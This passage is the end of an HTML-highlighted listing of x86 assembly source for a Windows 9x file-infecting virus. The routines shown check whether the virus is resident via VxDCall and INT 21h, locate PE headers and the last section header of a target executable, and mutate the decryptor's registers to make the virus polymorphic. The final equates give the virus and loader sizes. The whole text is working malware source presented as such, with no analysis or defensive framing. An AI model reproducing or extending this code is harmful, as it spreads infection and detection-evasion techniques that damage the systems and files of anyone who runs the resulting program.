    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Remove Buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;restore handle</span><span class="sc0">

</span><span class="sc1">;Close File</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF7E064h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">End_OutputFileName</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OutputFileName</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            IsVirusActive                               | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function returns 1 if the virus is active in memory, else returns</span><span class="sc0">
</span><span class="sc1">;      0. This function also saves the address of the VxDCall API.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 1 if the Virus is Resident. 0 otherwise</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_________________</span><span class="sc0">
</span><span class="sc5">IsVirusActive</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAddressOfKernelAPI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Get Address Of VxDCall API</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Found Address ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">End_IsVirusActive</span><span class="sc0">           </span><span class="sc1">;No, Return 0</span><span class="sc0">

</span><span class="sc1">;Save address of VxDCall API</span><span class="sc0">
    </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;Save Address</span><span class="sc0">

    </span><span class="sc1">;Check if Virus is Already Resident</span><span class="sc0">
    </span><span class="sc5">@CALL_INT21h</span><span class="sc0"> </span><span class="sc5">RESIDENCY_CHECK_SERVICE</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Assume not resident</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RESIDENCY_SUCCESS</span><span class="sc0">      </span><span class="sc1">;Is Virus Resident</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">End_IsVirusActive</span><span class="sc0">           </span><span class="sc1">;No, return 0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Yes, return 1</span><span class="sc0">

</span><span class="sc5">End_IsVirusActive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IsVirusActive</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            GetFileHeaders                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function retreives the address of various file headers, viz.,</span><span class="sc0">
</span><span class="sc1">;      Image File Header, Image Optional Header, Last Section Header,</span><span class="sc0">
</span><span class="sc1">;      Image Export Directory. The function fails if the specified file is</span><span class="sc0">
</span><span class="sc1">;      not a Portable Executable (PE) file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; gfh_dwFileBase: Base Address of File (in Memory) whose headers are</span><span class="sc0">
</span><span class="sc1">;      required.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: Address of the Image File Header, or 0 if the function failed</span><span class="sc0">
</span><span class="sc1">;   -&gt; EBX: Address of the Image Optional Header</span><span class="sc0">
</span><span class="sc1">;   -&gt; ECX: Address of the Last Sections Header</span><span class="sc0">
</span><span class="sc1">;   -&gt; EDX: Address of the Image Export Directory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;_______________________________________</span><span class="sc0">
</span><span class="sc5">GetFileHeaders</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">gfh_dwFileBase</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwIOH</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwIED</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gfh_dwFileBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">                </span><span class="sc1">;Is EXE/DLL Present ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Error_GetFileHeaders</span><span class="sc0">                </span><span class="sc1">;No</span><span class="sc0">

</span><span class="sc1">;Check for PE Signature</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">])</span><span class="sc5">.IDH_e_lfanew</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">               </span><span class="sc1">;PE File ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Error_GetFileHeaders</span><span class="sc0">                </span><span class="sc1">;No</span><span class="sc0">

</span><span class="sc1">;Get Image Optional Header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_NT_SIGNATURE</span><span class="sc0">      </span><span class="sc1">;Image File Header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;Save Image File Header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">         </span><span class="sc1">;Image Optional Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;Save</span><span class="sc0">

</span><span class="sc1">;Get the Address of the Image Export Directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">])</span><span class="sc5">.IOH_DataDirectory</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc5">.IDD_VirtualAddress</span><span class="sc0">  </span><span class="sc1">;RVA Image Export Directory</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gfh_dwFileBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Get Address of Last Section Header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;Get Image File header</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">])</span><span class="sc5">.IFH_SizeOfOptionalHeader</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;Address of First Section Header</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">])</span><span class="sc5">.IFH_NumberOfSections</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;Number of Sections - 1</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc1">;Size of All Section Headers</span><span class="sc0">
    </span><span class="sc1">;mov        ebx, SIZE IMAGE_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc1">;mul        ebx                                 ;Size of All Section Headers</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Address of Last Section Header</span><span class="sc0">

</span><span class="sc1">;Return Header Values</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;Image File Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIOH</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwIED</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_GetFileHeaders</span><span class="sc0">

</span><span class="sc5">Error_GetFileHeaders</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Error, Return 0</span><span class="sc0">

</span><span class="sc5">End_GetFileHeaders</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetFileHeaders</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            MutateDecryptor                             | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function modifies the registers used in the decryptor, to make it</span><span class="sc0">
</span><span class="sc1">;      polymorphic. The decrypor uses two registers; one as an index, and the</span><span class="sc0">
</span><span class="sc1">;      other as a counter. The registers EAX, EBX, ECX, EDX, ESI and EDI are</span><span class="sc0">
</span><span class="sc1">;      used as random registers. The opcodes are generated in the following way.</span><span class="sc0">
</span><span class="sc1">;      First the opcode is calculated using register EAX; e.g. the opcode for</span><span class="sc0">
</span><span class="sc1">;      POP EAX is 58h. To generate the opcodes for the other registers, we add</span><span class="sc0">
</span><span class="sc1">;      the number of the register. The number for EDX is 2. Adding this to 58h,</span><span class="sc0">
</span><span class="sc1">;      we get 5Ah, which is the opcode for POP EDX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; EDI: Start of decrypor that need to be mutated</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; AX, BL</span><span class="sc0">
</span><span class="sc1">;___________________</span><span class="sc0">
</span><span class="sc5">MutateDecryptor</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc1">;Get Two Random Registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomRegister</span><span class="sc0">              </span><span class="sc1">;Get First Register Number</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Save It</span><span class="sc0">
</span><span class="sc5">GetAnotherRegister</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomRegister</span><span class="sc0">              </span><span class="sc1">;Get Second Register Number</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Is it the same as First</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GetAnotherRegister</span><span class="sc0">          </span><span class="sc1">;Yes, get another one</span><span class="sc0">

</span><span class="sc1">;Modify Decryptor, so that it uses the new registers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">                     </span><span class="sc1">;Change "pop &lt;register1&gt;"</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Register 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                    </span><span class="sc1">;Change "add &lt;register1&gt;, ..."</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Register 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">                    </span><span class="sc1">;Change "mov &lt;register2&gt;, ..."</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">;Register 2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                     </span><span class="sc1">;Change "xor byte ptr [&lt;register1&gt;], ..."</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Register 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">;Change "inc &lt;register1&gt;"</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">;Register 1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                     </span><span class="sc1">;Change "dec &lt;register2&gt;"</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">;Register 2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MutateDecryptor</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            RandomRegister                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function returns a random number from 0, 1, 2, 3, 6, and 7. Each of</span><span class="sc0">
</span><span class="sc1">;      these values is used to identify a register.</span><span class="sc0">
</span><span class="sc1">;      EAX=0, ECX=1, EDX=2, EBX=3, ESI=6, EDI=7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; AL:  Random number (0, 1, 2, 3, 6 or 7)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; AL</span><span class="sc0">
</span><span class="sc1">;__________________</span><span class="sc0">
</span><span class="sc5">RandomRegister</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">NewRandom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">;Get Random Number</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">                </span><span class="sc1">;Maximum value 7</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">;Should not be 4...</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NewRandom</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">;...or 5</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NewRandom</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RandomRegister</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                          End Of Virus Code                             | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">
</span><span class="sc5">ENCRYPTED_SIZE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptedVirusCode</span><span class="sc0">
</span><span class="sc5">LOADER_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ENCRYPTED_SIZE</span><span class="sc0">
</span><span class="sc5">VIRUS_SIZE_PAGES</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">PAGE_SIZE</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">StartOfVirusCode</span><span class="sc0">
</span></div></body>
</html>
